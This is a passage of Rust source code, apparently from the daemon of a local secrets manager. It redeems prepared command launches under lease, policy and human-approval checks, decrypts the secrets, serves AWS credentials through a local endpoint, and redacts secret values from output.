            if g.lease_revision != launch.lease_revision || now() < taken.created_at || now() >= taken.expires_at
                || Instant::now() >= deadline
                || launch_authorizations(&g, &peer, &files, &launch.binding, cwd.as_deref(), &launch.scopes, &cfg)? != launch.decisions {
                bail!("launch refused");
            }
        }
        let mut detail = crate::audit::launch_detail(&launch.binding, cfg.audit_full_argv, &[]);
        detail["decisions"] = serde_json::to_value(&launch.decisions)?;
        detail["owner"] = json!({"pid":taken.owner.pid,"sec":taken.owner.sec,"usec":taken.owner.usec});
        detail["shim"] = json!({"pid":session._shim.pid,"sec":session._shim.sec,"usec":session._shim.usec});
        bind_external_work("redeem-auth-audit")?;
        let bio: Vec<_> = files.iter().filter(|f| f.tier == store::Tier::Bio
            && launch.decisions[&f.name] == crate::RunAuthorization::NeedsFreshAuth).cloned().collect();
        let v = peer_vault(session.p, &peer)?;
        let names = launch.refs.iter().chain(launch.allow_hosts.iter()).cloned().collect::<Vec<_>>().join(", ");
        if crate::platform::helper::prompt_param(&names) != names { bail!("policy.approval_prompt_too_long"); }
        // A policy approval must show the whole command: if the script is multi-line, cut,
        // or changed by prompt sanitizing, refuse rather than approve what the user can't see.
        let policy_context = if policy_approval { Some(policy_run_context(&approval_hash, launch.binding.argv())?) } else { None };
        detail["binding_hash"] = json!(crate::policy::hex(&approval_hash));
        let unwrapped = crate::audit::run(session.p, "launch-auth", &launch.refs, &peer.caller, detail, || {
            bind_external_work("redeem-auth")?;
            let mut unwrapped = Vec::new();
            proof = Some(crate::policy::approval::Approval::request(approval_hash, || {
                let prompt = if launch.sso_use && launch.refs.len() == 1 && !policy_approval && !launch.decisions.values().any(|d| *d == crate::RunAuthorization::NeedsFreshAuth) {
                    let (reg, _) = sso.as_ref().context("launch refused")?;
                    Prompt::SsoUse { name: reg.name.clone(), account: reg.profile.account_id.clone(), role: reg.profile.role_name.clone() }
                } else {
                    Prompt::Use { names, caller: peer.caller.label(),
                        context: policy_context.unwrap_or_else(|| crate::env::run_context(launch.binding.argv())) }
                };
                unwrapped = launch_fresh_auth(v, bio.clone(), prompt, deadline)?;
                Ok(())
            })?);
            Ok(unwrapped)
        })?;
        // Approval is not authority: reload even configuration and owner classification,
        // rehash target/script, and repeat all human-cache/live checks after the prompt.
        (cfg, peer, cwd, files) = launch_live_snapshot(session.p, session.st, taken.owner, session._shim, &launch)?;
        // A DEK from the pre-prompt ciphertext must never seed cache for a
        // replacement file, even when its authorization kind is unchanged.
        for (file, dek) in bio.iter().zip(unwrapped) {
            let live = files.iter().find(|f| f.name == file.name).context("launch refused")?;
            if serde_json::to_value(file)? != serde_json::to_value(live)? { bail!("launch refused"); }
            fresh_deks.insert(file.name.clone(), dek);
        }
    }
    // Re-evaluate after user presence. A newly added approval cannot reuse absent proof.
    let still_requires = launch_policy(session.p, &peer.caller, &launch.refs, &launch.allow_hosts)?;
    if let Some(mut proof) = proof {
        proof.consume(launch_approval_hash(&launch, taken.owner)?)?;
    } else if still_requires { bail!("policy.approval_required"); }
    check_agent_access(session.p, session.st, &peer.caller)?;
    let anchor = peer.human_anchor();
    let hours = cfg.human_lease_hours.clamp(0.0, 3.0);
    let (deks, cache_candidates) = {
        let mut g = session.st.lock().unwrap();
        check_launch_sso(&g, &launch)?;
        // Linearization point: Cancel/Revoke/expiry/shim-death during the
        // verification above burned the Redeeming entry; refuse before consuming.
        g.pending_launches.finalize_redeem(&session.id, taken.owner, taken.created_at, taken.expires_at, session._shim, now(), launch.aws.is_some())?;
        if now() < taken.created_at || now() >= taken.expires_at || Instant::now() >= deadline
            || g.lease_revision != launch.lease_revision { bail!("launch refused"); }
        // Recompute from live policy and lease authority, never trust the kind
        // stored by Prepare. No changes, including stronger authority, are accepted.
        let decisions = launch_authorizations(&g, &peer, &files, &launch.binding, cwd.as_deref(), &launch.scopes, &cfg)?;
        if decisions != launch.decisions { bail!("launch refused"); }
        let mut deks = fresh_deks;
        for (name, decision) in &decisions {
            if *decision == crate::RunAuthorization::Lease {
                deks.insert(name.clone(), g.leases.get(name).context("launch refused")?.dek.clone());
            }
        }
        let human_keys = decisions.iter().filter(|(_, d)| **d == crate::RunAuthorization::HumanCached)
            .map(|(name, _)| human_cache_key(&g, &peer, name).context("launch refused"))
            .collect::<Result<Vec<_>>>()?;
        for (name, decision) in &decisions {
            if *decision != crate::RunAuthorization::Lease { continue; }
            let h = g.leases.get_mut(name).context("launch refused")?;
            h.uses += 1;
            if h.scope.max_uses.is_some_and(|m| h.uses >= m) { g.leases.remove(name); }
        }
        for key in human_keys {
            let h = g.human.get_mut(&key).expect("validated cache key");
            h.uses += 1;
            deks.insert(key.2, h.dek.clone());
        }
        // Finalization and all authority checks succeeded. Match HumanUnlock's
        // anchor, eligibility and three-hour clamp; fresh Open never seeds the human cache.
        // Like HumanUnlock, cache only AFTER every payload authenticates (below):
        // a wrapped DEK can unwrap while its payload is corrupt.
        let mut cache_candidates = Vec::new();
        for file in &files {
            if file.tier != store::Tier::Bio || decisions[&file.name] != crate::RunAuthorization::NeedsFreshAuth { continue; }
            if let Some((pid, start)) = anchor.filter(|_| hours > 0.0 && !file.agent_allowed && !file.is_public()) {
                let expires = now() + (hours * 3600.0).round() as u64;
                let info = LeaseInfo { name: file.name.clone(), to: Grantee::Human,
                    to_label: format!("human anchor pid:{pid}@{start}"), granted: now(), expires,
                    remaining: expires.saturating_sub(now()), by: format!("peer pid:{}", peer.pid) };
                cache_candidates.push(((pid, start, file.name.clone()), Held { info,
                    dek: deks[&file.name].clone(), root: Some((pid, start)), scope: Scope::default(), uses: 0 }));
            }
        }
        (deks, cache_candidates)
    };
    // Like legacy Use, authorization linearizes at consumption. A later revoke
    // cannot recall this release; failed audit/decrypt/delivery still costs a use.
    // Secrets whose keys are already in hand can be named in argv; the rest rely on masking.
    let known: Vec<(String, Zeroizing<Vec<u8>>)> = files.iter()
        .filter_map(|f| Some((f.name.clone(), crate::crypto::open(deks.get(&f.name)?, f).ok()?))).collect();
    let mut detail = {
        let known_refs: Vec<(String, &[u8])> = known.iter().map(|(n, v)| (n.clone(), v.as_slice())).collect();
        crate::audit::launch_detail(&launch.binding, cfg.audit_full_argv, &known_refs)
    };
    drop(known);
    let identity = |i: agent::ProcessIdentity| json!({"pid":i.pid,"sec":i.sec,"usec":i.usec});
    detail["owner"] = identity(taken.owner);
    detail["shim"] = identity(session._shim);
    detail["decisions"] = serde_json::to_value(&launch.decisions)?;
    bind_external_work("redeem-audit")?;
    crate::audit::run(session.p, "launch-redeem", &launch.refs, &peer.caller, detail, || {
        let mut deks = deks;
        let rest: Vec<_> = files.iter().filter(|f| !deks.contains_key(&f.name)).cloned().collect();
        if !rest.is_empty() {
            bind_external_work("redeem-unwrap")?;
            let v = peer_vault(session.p, &peer)?;
            let reason = Prompt::Use { names: launch.refs.join(", "), caller: peer.caller.label(),
                context: crate::env::run_context(launch.binding.argv()) };
            for (file, dek) in rest.iter().zip(v.unwrap_deks_local(&rest, &reason)?) {
                deks.insert(file.name.clone(), dek);
            }
        }
        let mut aws_dek_hash = None;
        let mut values = std::collections::BTreeMap::new();
        for file in &files {
            bind_external_work("redeem-open")?;
            let dek = deks.remove(&file.name).context("launch refused")?;
            let value = crate::crypto::open(&dek, file)?;
            if launch.aws.as_ref() == Some(&file.name) && launch.sso_binding.is_some() {
                aws_dek_hash = Some(crate::sso::sha256_hex(dek.as_ref()));
            }
            drop(dek);
            // Environment values are UTF-8 strings without NUL; never a lossy copy.
            let text = std::str::from_utf8(&value)?;
            if text.contains('\0') { bail!("launch refused"); }
            // A session_mint key reaches a child only as a minted session through
            // `karambit aws`; as a plain `-e VAR=aws/NAME` value it would defeat that.
            if crate::aws::is_aws_entry(&file.name) && launch.aws.as_ref() != Some(&file.name) && crate::aws::session_mint_enabled(&value) {
                bail!("launch refused");
            }
            values.insert(file.name.clone(), value);
        }
        // Every payload authenticated. Commit fresh human-cache entries under a guarded
        // recheck so an intervening Revoke/lockdown (revision bump) cannot be
        // undone by this insert; a dropped candidate just means a prompt next time.
        if !cache_candidates.is_empty() {
            let mut g = session.st.lock().unwrap();
            if g.lease_revision == launch.lease_revision {
                for (key, held) in cache_candidates { g.human.insert(key, held); }
            }
        }
        fn serialize_token<S: serde::Serializer>(token: &Zeroizing<String>, s: S) -> std::result::Result<S::Ok, S::Error> { s.serialize_str(token) }
        #[derive(Serialize)]
        struct AwsBundle {
            url: String,
            #[serde(serialize_with = "serialize_token")]
            token: Zeroizing<String>,
            #[serde(skip_serializing_if = "Option::is_none")]
            region: Option<String>,
            endpoint_id: String,
            #[serde(skip_serializing_if = "Option::is_none")]
            account: Option<String>,
            #[serde(skip_serializing_if = "Option::is_none")]
            role: Option<String>,
        }
        let mut redactions: Vec<(String, Zeroizing<Vec<u8>>)> = files.iter()
            .filter(|f| !f.is_public() && Some(&f.name) != launch.aws.as_ref())
            .map(|f| (f.name.clone(), values[&f.name].clone())).collect();
        launch_backend_values(session.p, session.st, &peer, &cfg, &launch.refs, &mut values, &mut redactions)?;
        let mut static_aws = false;
        let aws = if let Some(name) = &launch.aws {
            let value = values.remove(name).context("launch refused")?;
            let entry = crate::sso::parse_entry(&value)?;
            bind_external_work("redeem-aws")?;
            let (serialized, region, account, role, ttl) = match (entry, &sso) {
                (crate::sso::AwsEntry::Static(creds), None) => {
                    static_aws = true;
                    redactions.splice(0..0, creds.secret_parts().into_iter().map(|(part, val)| (format!("{name}:{part}"), Zeroizing::new(val.to_vec()))));
                    let region = creds.region.clone();
                    // session_mint profiles serve a one-hour STS session instead of the
                    // key; a failed exchange refuses the launch (never serves the key).
                    bind_external_work("redeem-aws-mint")?;
                    let served = creds.endpoint_credentials()?;
                    if served.minted {
                        // The console-refresh hint is wrong for a minted session.
                        static_aws = false;
                        redactions.splice(0..0, served.creds.secret_parts().into_iter().map(|(part, val)| (format!("{name}:minted-{part}"), Zeroizing::new(val.to_vec()))));
                    }
                    (Zeroizing::new(String::from_utf8(served.creds.to_json()?.to_vec())?), region, None, None, served.ttl)
                },
                (crate::sso::AwsEntry::Sso(_), Some((reg, binding))) => {
                    if reg.dek_sha256.as_ref().is_some_and(|want| aws_dek_hash.as_ref() != Some(want)) { bail!("launch refused"); }
                    bind_external_work("redeem-sso-mint")?;
                    sso_fresh_creds_bound(session.st, session.p, name, binding)?;
                    // unlock_run passes twelve hours to internal SsoOpen, whose
                    // clamp is 60 seconds through twelve hours (not static's 4h).
                    (Zeroizing::new(String::new()), Some(reg.profile.child_region().to_string()),
                        Some(reg.profile.account_id.clone()), Some(reg.profile.role_name.clone()), (12 * 3600u64).clamp(60, 12 * 3600))
                }
                _ => bail!("launch refused"),
            };
            let (id, token) = new_endpoint_ids();
            let expires = Instant::now() + Duration::from_secs(ttl);
            let created_at = now();
            let mut g = session.st.lock().unwrap();
            check_launch_sso(&g, &launch)?;
            if g.lease_revision != launch.lease_revision || g.aws.contains_key(&id) || Instant::now() >= deadline { bail!("launch refused"); }
            g.pending_launches.deliver(&session.id, taken.owner, session._shim, id.clone(), created_at, created_at + ttl)?;
            g.aws.insert(id.clone(), AwsEp { caller: peer.caller.clone(), profile: name.clone(), creds: serialized, token: token.clone(), expires,
                sso: launch.sso_binding.as_ref().map(|_| name.clone()), binding: launch.sso_binding.clone(),
                launch: launch.sso_binding.as_ref().map(|_| session.id.clone()), unredacted: launch.no_redact });
            session.endpoint = Some((id.clone(), expires));
            drop(g);
            Some(AwsBundle { url: format!("http://127.0.0.1:{}/creds/{id}", session.http_port), token: Zeroizing::new(token), region, endpoint_id: id, account, role })
        } else { None };
        #[derive(Serialize)]
        struct Bundle<'a> {
            target: &'a CommandBinding,
            argv: &'a [String],
            cwd: &'a Path,
            env: std::collections::BTreeMap<&'a str, &'a str>,
            #[serde(skip_serializing_if = "Option::is_none")]
            aws: Option<AwsBundle>,
        }
        let env = launch.env.iter().map(|(name, reference)| {
            let value = values.get(reference).context("launch refused")?;
            Ok((name.as_str(), std::str::from_utf8(value)?))
        }).collect::<Result<_>>()?;
        // The bearer token is already disclosed to the target; releasing it to
        // its authenticated Mode-A owner adds no reference/credential authority.
        if let Some(aws) = &aws { redactions.push(("AWS_CONTAINER_AUTHORIZATION_TOKEN".into(), Zeroizing::new(aws.token.as_bytes().to_vec()))); }
        #[derive(Serialize)]
        struct Redaction<'a> { values: Vec<(&'a str, &'a str)>, static_aws: bool, #[serde(skip_serializing_if = "std::ops::Not::not")] updates: bool }
        // SSO role credentials are minted after this frame; the owner stays connected to learn them.
        let updates = aws.is_some() && launch.sso_binding.is_some();
        let redaction = launch_frame(&Redaction { values: redactions.iter().map(|(n,v)| Ok((n.as_str(), std::str::from_utf8(v)?))).collect::<Result<_>>()?, static_aws, updates })?;
        let bundle = Bundle { target: launch.binding.target(), argv: launch.binding.argv(), cwd: launch.binding.cwd(), env, aws };
        let line = launch_frame(&bundle)?;
        bind_external_work("redeem-write")?;
        if agent::process_identity(session._shim.pid)? != session._shim
            || agent::process_parent_identity(session._shim)? != taken.owner { bail!("launch refused"); }
        c.set_write_timeout(Some(deadline.checked_duration_since(Instant::now()).context("launch refused")?))?;
        {
            let mut g = session.st.lock().unwrap();
            if now() >= taken.expires_at || !g.pending_launches.redaction_live(&session.id, taken.owner, session._shim, now()) { bail!("launch refused"); }
            g.launch_redactions.insert(session.id.clone(), LaunchRedaction { caller: peer.caller.clone(), owner: taken.owner, shim: session._shim, expires_at: taken.expires_at, frame: redaction, updates });
        }
        check_agent_access(session.p, session.st, &peer.caller)?;
        c.write_all(&line)?;
        Ok(())
    })
}

/// Reject duplicate JSON keys rather than silently keeping the last env binding.
fn launch_env<'de, D: serde::Deserializer<'de>>(d: D) -> std::result::Result<std::collections::BTreeMap<String, String>, D::Error> {
    struct Env;
    impl<'de> serde::de::Visitor<'de> for Env {
        type Value = std::collections::BTreeMap<String, String>;
        fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result { f.write_str("unique env bindings") }
        fn visit_map<M: serde::de::MapAccess<'de>>(self, mut map: M) -> std::result::Result<Self::Value, M::Error> {
            let mut result = std::collections::BTreeMap::new();
            while let Some((key, value)) = map.next_entry::<String, String>()? {
                if result.insert(key, value).is_some() { return Err(serde::de::Error::custom("duplicate env binding")); }
            }
            Ok(result)
        }
    }
    d.deserialize_map(Env)
}

fn audit_contained_launches(p: &Paths, action: &str, launches: Vec<crate::launch::PendingLaunch>) {
    let caller = agent::Caller { chain: vec!["karambit-daemon".into()], ..Default::default() };
    for launch in launches { crate::audit::launch_contained(p, action, &launch, &caller); }
}

fn expire_launches(p: &Paths, st: &Mutex<State>, at: u64) {
    let shims = st.lock().unwrap().pending_launches.bound_shims();
    // Never perform kernel reads while State is locked.
    let dead: Vec<_> = shims.into_iter().filter(|(_, shim)| agent::process_identity(shim.pid).ok() != Some(*shim)).collect();
    let owners: Vec<_> = st.lock().unwrap().launch_redactions.iter().map(|(id, r)| (id.clone(), r.owner)).collect();
    let dead_owners: Vec<_> = owners.into_iter().filter(|(_, owner)| agent::process_identity(owner.pid).ok() != Some(*owner)).collect();
    let expired = {
        let mut g = st.lock().unwrap();
        for (id, _) in dead_owners { g.pending_launches.burn_bound(&id); }
        for (id, _) in dead { g.pending_launches.burn_bound(&id); }
        let expired = g.pending_launches.expire(at);
        g.reconcile_launch_endpoints();
        expired
    };
    audit_bound_containment(p, st);
    audit_contained_launches(p, "launch-expire", expired);
}

#[cfg(test)]
thread_local! {
    static LAUNCH_CAPTURE_HOOK: std::cell::RefCell<Option<Box<dyn FnOnce()>>> = const { std::cell::RefCell::new(None) };
}

/// Same screen-lock invalidation used by legacy Use and bound cache checks.
/// The helper probe and containment audit must remain outside State.
fn check_human_cache_screen(p: &Paths, st: &Mutex<State>) -> bool {
    let have = !st.lock().unwrap().human.is_empty();
    if have && crate::platform::helper::screen_locked(&p.keys()) {
        let dropped = {
            let mut g = st.lock().unwrap();
            let dropped: Vec<String> = g.human.keys().map(|(_, _, name)| name.clone()).collect();
            g.human.clear();
            g.lease_revision += 1;
            dropped
        };
        if !dropped.is_empty() { log_event(p, "lease-ended", &dropped, json!({"why": "screen locked"})); }
        return false;
    }
    have
}

/// Metadata-only human-cache lookup. human_anchor also rejects env_unknown and requires
/// the kernel-resolved anchor to occur in this peer's ancestry.
fn human_cache_key(g: &State, peer: &agent::Peer, name: &str) -> Option<(i32, u64, String)> {
    let (pid, start) = peer.human_anchor()?;
    let key = (pid, start, name.to_owned());
    g.human.get(&key).filter(|h| h.info.expires > now()).map(|_| key)
}

/// In-memory authorization only. Files, canonical cwd and target snapshots must be
/// loaded outside State. An invalid explicit lease falls back to stored policy,
/// just like legacy Use + Unlock(run); it cannot elevate a human caller.
fn launch_authorizations(
    g: &State, peer: &agent::Peer, files: &[store::SecretFile],
    binding: &crate::launch::LaunchBinding, cwd: Option<&str>,
    scopes: &HashMap<String, Scope>, cfg: &store::Config,
) -> Result<std::collections::BTreeMap<String, crate::RunAuthorization>> {
    use crate::RunAuthorization::*;
    files.iter().map(|file| {
        let lease = peer.caller.is_agent() && !file.is_public() && g.leases.get(&file.name).is_some_and(|h| {
            let who = match (&h.info.to, h.root) {
                (Grantee::Any, _) => true,
                (Grantee::Kind(k), _) => peer.caller.kind.as_deref() == Some(k.as_str()),
                (Grantee::Session(_), Some(root)) => peer.descends_from(root),
                _ => false,
            };
            who && h.info.expires > now() && scopes.get(&file.name) == Some(&h.scope)
                && !h.scope.max_uses.is_some_and(|m| h.uses >= m)
                && !h.scope.cwd.as_ref().is_some_and(|root| !cwd.is_some_and(|c| under(c, root))
                    || !binding.cwd().to_str().is_some_and(|c| under(c, root)))
                && binding.check_scope(&h.scope.cmds).is_ok()
        });
        let cached = crate::human_cache_eligible(&peer.caller, cfg, file)
            && human_cache_key(g, peer, &file.name).is_some();
        let decision = crate::run_authorization(&peer.caller, file, lease, cached);
        // Fresh proof is human-only, including public/agent-allowed Bio.
        // A remote human gets its own message: nothing here names a secret.
        if decision == Deny && crate::ssh_without_human(&peer.caller) { bail!(crate::SSH_HUMAN_REFUSAL); }
        if decision == Deny || (decision == NeedsFreshAuth && peer.caller.is_agent()) { bail!("launch refused"); }
        Ok((file.name.clone(), decision))
    }).collect()
}

/// Snapshot registration authority without prompt, decrypt or network. Validation
/// runs outside State; the tombstoned binding is rechecked at every commit.
fn launch_sso(st: &Mutex<State>, name: Option<&String>, peer: &agent::Peer) -> Result<Option<(crate::sso::SsoReg, SsoBinding)>> {
    let Some(name) = name else { return Ok(None); };
    let snapshot = {
        let g = st.lock().unwrap();
        g.sso_profiles.get(name).map(|reg| Ok::<_, anyhow::Error>((reg.clone(), g.binding(name)?))).transpose()?
    };
    if let Some((reg, _)) = &snapshot {
        validate_sso_registration(reg)?;
        if peer.caller.is_agent() && !reg.agent_allowed { bail!("launch refused"); }
        // An Only-me Open profile is approved by a Touch ID prompt nobody local would answer.
        if reg.tier == store::Tier::Open && !reg.agent_allowed && crate::ssh_without_human(&peer.caller) { bail!(crate::SSH_HUMAN_REFUSAL); }
    }
    Ok(snapshot)
}

fn check_launch_sso(g: &State, launch: &crate::launch::PendingLaunch) -> Result<()> {
    if let Some(name) = &launch.aws {
        match &launch.sso_binding {
            Some(binding) => g.check_binding(name, binding)?,
            None if g.sso_profiles.contains_key(name) => bail!("launch refused"),
            None => (),
        }
    }
    Ok(())
}

// Classify without backend I/O; backend references never enter the legacy store.
fn launch_legacy_files(p: &Paths, cfg: &store::Config, peer: &agent::Peer, refs: &[String]) -> Result<Vec<store::SecretFile>> {
    let mut files = Vec::new();
    for reference in refs {
        match crate::classify_reference(cfg, reference)? {
            crate::backend::Reference::Legacy(name) => files.push(store::load_secret(p, &name)?),
            crate::backend::Reference::Backend(_) => {
                if peer.caller.is_agent() { bail!(crate::backend::BackendError::NeedsHuman); }
            }
        }
    }
    Ok(files)
}

// Called only after bound redemption authorization, outside State/Backends locks.
// Values remain local until the existing protected child and owner releases.
fn launch_backend_values(p: &Paths, st: &Ctx, peer: &agent::Peer, cfg: &store::Config, refs: &[String],
    values: &mut std::collections::BTreeMap<String, Zeroizing<Vec<u8>>>,
    redactions: &mut Vec<(String, Zeroizing<Vec<u8>>)>,
) -> Result<()> {
    for reference in refs {
        if !matches!(crate::classify_reference(cfg, reference)?, crate::backend::Reference::Backend(_)) { continue; }
        let delivery = resolve_values(p, st, peer, reference, None)?;
        if delivery.fields.len() != 1 { bail!(crate::backend::BackendError::InvalidRef); }
        let value = match delivery.fields.into_values().next().context("launch refused")? {
            crate::backend::SecretField::Text(v) => Zeroizing::new(v.as_bytes().to_vec()),
            crate::backend::SecretField::Bytes(v) => v,
        };
        if std::str::from_utf8(&value)?.contains('\0') { bail!("launch refused"); }
        // The existing protected redaction frame is UTF-8. Fail closed rather
        // than silently omitting an unselected binary field from redaction.
        for bytes in delivery.redact {
            std::str::from_utf8(&bytes)?;
            redactions.push((reference.clone(), bytes));
        }
        values.insert(reference.clone(), value);
    }
    Ok(())
}

fn launch_policy(p: &Paths, caller: &agent::Caller, refs: &[String], hosts: &[String]) -> Result<bool> {
    let mut approve = false;
    for name in refs {
        approve |= crate::policy::check(p, caller, crate::policy::Action::Run, &crate::policy::Subject::Secret(name.clone()))?;
    }
    for host in hosts {
        approve |= crate::policy::check(p, caller, crate::policy::Action::Egress, &crate::policy::Subject::Egress(host.clone()))?;
    }
    Ok(approve)
}

/// `run approval <hash prefix>: <command>`, only if the command is shown in full.
fn policy_run_context(approval_hash: &[u8; 32], argv: &[String]) -> Result<String> {
    let prefix = format!("run approval {}: ", &crate::policy::hex(approval_hash)[..8]);
    let room = crate::env::PROMPT_CONTEXT_MAX.saturating_sub(prefix.chars().count());
    let (command, complete) = crate::env::run_context_within(argv, room);
    let context = format!("{prefix}{command}");
    if !complete || crate::platform::helper::prompt_param(&context) != context { bail!("policy.approval_prompt_too_long"); }
    Ok(context)
}

fn launch_approval_hash(launch: &crate::launch::PendingLaunch, owner: agent::ProcessIdentity) -> Result<[u8; 32]> {
    let subjects = serde_json::to_vec(&(&launch.refs, &launch.allow_hosts))?;
    let caller = serde_json::to_vec(&(&launch.caller, owner.pid, owner.sec, owner.usec))?;
    let args = serde_json::to_vec(&json!({"binding":crate::audit::launch_snapshot(&launch.binding),
        "argv":launch.binding.argv(),"cwd":launch.binding.cwd(),"env":launch.env,"aws":launch.aws,"jail_requested":launch.jail_requested}))?;
    Ok(crate::policy::approval::binding(&[b"run", &subjects, &caller, &args]))
}

/// References and decision kinds only: no Use/Unlock, DEK read or prompt here.
#[allow(clippy::too_many_arguments)]
fn prepare_launch(p: &Paths, st: &Mutex<State>, peer: &agent::Peer, refs: Vec<String>, env: std::collections::BTreeMap<String, String>, target: PathBuf, argv: Vec<String>, cwd: PathBuf, aws: Option<String>, jail: bool, allow_hosts: Vec<String>, ambient_bytes: u64, no_redact: bool) -> Result<Value> {
    if let Some(name) = &aws {
        let profile = name.strip_prefix("aws/").context("launch refused")?;
        if crate::aws::entry_name(profile)? != *name || env.values().any(|r| r == name) { bail!("launch refused"); }
    }
    launch_policy(p, &peer.caller, &refs, &allow_hosts)?;
    let sso = launch_sso(st, aws.as_ref(), peer)?;
    let sso_binding = sso.as_ref().map(|(_, binding)| binding.clone());
    let sso_use = sso.as_ref().is_some_and(|(reg, _)| reg.tier == store::Tier::Open && !reg.agent_allowed);
    let derived: std::collections::BTreeSet<_> = env.values().chain(aws.iter()).cloned().collect();
    let supplied: std::collections::BTreeSet<_> = refs.iter().cloned().collect();
    // Jail-only computation needs no secret authority; this flag grants none.
    // Confinement itself is installed from the private owner/shim instruction.
    if (!jail && derived.is_empty()) || derived != supplied || supplied.len() != refs.len() || env.keys().any(|k| {
        let mut bytes = k.bytes();
        !bytes.next().is_some_and(|c| c.is_ascii_alphabetic() || c == b'_') || bytes.any(|c| !c.is_ascii_alphanumeric() && c != b'_')
    }) { bail!("launch refused"); }
    let owner = agent::process_identity(peer.pid).map_err(|_| anyhow!("launch refused"))?;
    // Unredacted only with this owner's still-fresh approval for this command, spent here.
    // Never from a bare flag: an agent could otherwise ask for a launch no filter watches.
    if no_redact {
        let mut g = st.lock().unwrap();
        let at = now();
        g.unredacted_approvals.retain(|(_, _, until)| *until > at);
        let command = argv.first();
        let found = g.unredacted_approvals.iter().position(|(o, c, _)| *o == owner && Some(c) == command);
        let Some(i) = found else { bail!("launch refused") };
        g.unredacted_approvals.remove(i);
    }
    // Authenticate the kernel executable against the owner-established CLI/daemon
    // pin. Do not accept a wire executable, basename or caller-supplied hash.
    let exe = agent::proc_exe(peer.pid).context("launch refused")?;
    let pins = std::fs::read_to_string(p.keys().join("daemon.sha256")).context("launch refused")?;
    // One fd supplies hash and dev/inode/size; Redeem compares them after the prompt.
    let owner_exe = CommandBinding::snapshot_regular_file(&std::fs::canonicalize(&exe).context("launch refused")?, false)
        .ok().flatten().context("launch refused")?;
    let CommandBinding::Pinned { sha256: hash, .. } = &owner_exe.0 else { bail!("launch refused") };
    if !pins.lines().any(|pin| pin.trim() == hash) { bail!("launch refused"); }
    let (scopes, revision): (HashMap<_, _>, _) = {
        let g = st.lock().unwrap();
        (refs.iter().filter_map(|n| g.leases.get(n).map(|h| (n.clone(), h.scope.clone()))).collect(), g.lease_revision)
    };
    #[cfg(test)]
    LAUNCH_CAPTURE_HOOK.with(|h| { if let Some(hook) = h.borrow_mut().take() { hook(); } });
    let binding = crate::launch::LaunchBinding::capture(target, argv, cwd)?;
    let peer_cwd = peer.cwd_abs().map(|c| canon_dir(&c));
    if agent::process_identity(peer.pid)? != owner || agent::proc_exe(peer.pid).as_deref() != Some(exe.as_str()) { bail!("launch refused"); }
    let id = crate::launch::PendingLaunches::new_id()?;
    let cfg = store::load_config(p)?;
    let files = launch_legacy_files(p, &cfg, peer, &refs)?;
    let have_cache = !st.lock().unwrap().human.is_empty();
    if files.iter().any(|f| crate::human_cache_eligible(&peer.caller, &cfg, f))
        && have_cache && !check_human_cache_screen(p, st) { bail!("launch refused"); }
    let decisions = launch_authorizations(&st.lock().unwrap(), peer, &files, &binding, peer_cwd.as_deref(), &scopes, &cfg)?;
    // Before any prompt, lease use or redeem: a launch that can't be exec'd must not cost either.
    // After authorization on purpose: the error states sizes, which an unauthorized caller must not probe.
    check_launch_size(&files, &env, aws.as_deref(), &binding, ambient_bytes, exec_arg_max())?;
    let mut detail = crate::audit::launch_detail(&binding, cfg.audit_full_argv, &[]);
    detail["decisions"] = serde_json::to_value(&decisions)?;
    detail["sso_use"] = json!(sso_use);
    detail["owner"] = json!({"pid":owner.pid,"sec":owner.sec,"usec":owner.usec});
    detail["shim"] = Value::Null;
    // Intent includes the actual snapshot and precedes insertion. Audit and hashing
    // never hold State; final live lease/revision validation closes revoke races.
    crate::audit::run(p, "launch-prepare", &refs, &peer.caller, detail, || {
        let mut g = st.lock().unwrap();
        if g.lease_revision != revision { bail!("launch refused"); }
        if launch_authorizations(&g, peer, &files, &binding, peer_cwd.as_deref(), &scopes, &cfg)? != decisions { bail!("launch refused"); }
        let launch = crate::launch::PendingLaunch { allow_hosts, jail_requested: jail, binding, owner_exe, refs: refs.clone(), env, aws, sso_binding, sso_use, lease_revision: revision, scopes, caller: peer.caller.clone(), decisions, no_redact };
        check_launch_sso(&g, &launch)?;
        let (id, expires_at) = g.pending_launches.insert(id, owner, launch, now())?;
        Ok(json!({"id": id, "expires_at": expires_at}))
    })
}

/// A `RunUnredacted` approval is spent by the very next prepare; it is not a standing right.
const UNREDACTED_APPROVAL_SECONDS: u64 = 120;
const UNREDACTED_APPROVAL_CAPACITY: usize = 16;

const SCOPED_LEGACY_REFUSAL: &str = "scoped lease: use `karambit run`";
/// Which of `names` are `aws/*` leases whose stored profile is `session_mint`, or can't be
/// told (fail closed). Decrypts with the lease's own DEK, outside State.
fn session_mint_leases(p: &Paths, st: &Mutex<State>, names: &[String]) -> std::collections::HashSet<String> {
    let deks: Vec<_> = {
        let g = st.lock().unwrap();
        names.iter().filter(|n| crate::aws::is_aws_entry(n)).filter_map(|n| g.leases.get(n).map(|h| (n.clone(), h.dek.clone()))).collect()
    };
    deks.into_iter().filter(|(name, dek)| {
        store::load_secret(p, name).and_then(|f| crate::crypto::open(dek, &f))
            .map_or(true, |value| crate::aws::session_mint_enabled(&value))
    }).map(|(name, _)| name).collect()
}

const SESSION_MINT_REFUSAL: &str = "session-mint profile: use `karambit aws NAME -- COMMAND`";

// Diagnostic/defense-in-depth lookup only: never spends lease authority. The
// peer is kernel-derived; command claims are deliberately irrelevant here.
fn active_scoped_lease(g: &State, peer: &agent::Peer, name: &str) -> bool {
    peer.caller.is_agent() && g.leases.get(name).is_some_and(|h| {
        h.info.expires > now() && !h.scope.cmds.is_empty() && match (&h.info.to, h.root) {
            (Grantee::Any, _) => true,
            (Grantee::Kind(k), _) => peer.caller.kind.as_deref() == Some(k.as_str()),
            (Grantee::Session(_), Some(root)) => peer.descends_from(root),
            _ => false,
        }
    })
}

// gate_open disclosures intentionally skip Use. Add advice only to an already
// denied policy; do not turn get/reveal/copy into lease-authorized disclosures.
fn legacy_unlock_error(p: &Paths, st: &Mutex<State>, peer: &agent::Peer, names: &[String], error: anyhow::Error) -> anyhow::Error {
    if peer.caller.is_agent()
        && let Ok(files) = peer_vault(p, peer).and_then(|v| v.resolve(names))
    {
        let denied: Vec<_> = files.iter().filter(|f| crate::run_authorization(&peer.caller, f, false, false) == crate::RunAuthorization::Deny).collect();
        let g = st.lock().unwrap();
        if denied.iter().any(|f| active_scoped_lease(&g, peer, &f.name)) {
            return anyhow!("{error}; {SCOPED_LEGACY_REFUSAL}");
        }
    }
    error
}

fn source_policy_digest(source: &crate::backend::SourceConfig) -> String {
    use sha2::{Digest, Sha256};
    // serde_json's default map is sorted recursively; validate rejects floats.
